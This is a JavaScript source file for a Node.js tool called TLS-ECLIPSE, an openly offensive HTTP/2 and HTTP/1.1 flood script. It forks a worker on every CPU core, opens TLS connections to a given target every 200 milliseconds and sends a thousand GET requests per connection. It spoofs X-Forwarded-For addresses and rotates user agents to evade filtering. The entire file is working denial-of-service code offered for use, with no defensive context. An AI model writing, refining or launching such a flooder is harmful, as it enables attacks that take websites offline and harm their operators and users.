// TLS-ECLIPSE.js
const fs = require('fs');
const url = require('url');
const http2 = require('http2');
const tls = require('tls');
const cluster = require('cluster');
const os = require('os');

if (process.argv.length !== 4) {
    console.log(`Usage: node TLS-ECLIPSE.js <target> <duration-in-seconds>`);
    process.exit(0);
}

const target = process.argv[2];
const duration = parseInt(process.argv[3]);

const parsed = url.parse(target);
const host = parsed.host;
const path = parsed.path || '/';
const port = 443;
const cores = os.cpus().length;
const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...",
    // Add more for max effect
];

function randIP() {
    return `${rand(1, 255)}.${rand(0, 255)}.${rand(0, 255)}.${rand(0, 255)}`;
}

function rand(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

if (cluster.isMaster) {
    console.log(`======================================`);
    console.log(`         TLS-ECLIPSE ATTACKER`);
    console.log(`======================================`);
    console.log(`[+] Target     : ${target}`);
    console.log(`[+] Duration   : ${duration}s`);
    console.log(`[+] Cores Used : ${cores}`);
    console.log(`======================================`);

    for (let i = 0; i < cores; i++) {
        cluster.fork();
    }

    const start = new Date().toLocaleTimeString();
    console.log(`\n[+] Attack Started @ ${start}`);

    setTimeout(() => {
        console.log(`\n[+] Attack Ended @ ${new Date().toLocaleTimeString()}`);
        process.exit(1);
    }, duration * 1000);
} else {
    let loopCount = 0;

    function launchAttack() {
        const socket = tls.connect({
            host,
            port,
            servername: host,
            rejectUnauthorized: false,
            ALPNProtocols: ['h2', 'http/1.1'],
        });

        socket.setKeepAlive(true, 1000);

        socket.on('secureConnect', () => {
            let protocol = socket.alpnProtocol;

            if (protocol === 'h2') {
                const client = http2.connect(parsed.href, {
                    createConnection: () => socket
                });

                client.on('error', () => {});

                for (let i = 0; i < 1000; i++) {
                    const headers = {
                        ':method': 'GET',
                        ':path': path,
                        'user-agent': userAgents[Math.floor(Math.random() * userAgents.length)],
                        'x-forwarded-for': randIP(),
                        'accept': '*/*'
                    };

                    const req = client.request(headers);
                    req.on('response', () => {});
                    req.end();
                }

                setTimeout(() => {
                    client.close();
                    socket.destroy();
                }, 1500);
            } else {
                const req = `GET ${path} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${userAgents[Math.floor(Math.random() * userAgents.length)]}\r\nX-Forwarded-For: ${randIP()}\r\nConnection: keep-alive\r\n\r\n`;

                for (let i = 0; i < 1000; i++) {
                    socket.write(req);
                }

                setTimeout(() => socket.destroy(), 1500);
            }

            loopCount++;
        });

        socket.on('error', () => {});
    }

    const interval = setInterval(launchAttack, 200);

    process.on('exit', () => {
        console.log(`[+] Worker PID: ${process.pid} sent ~${loopCount * 1000} requests`);
    });
}
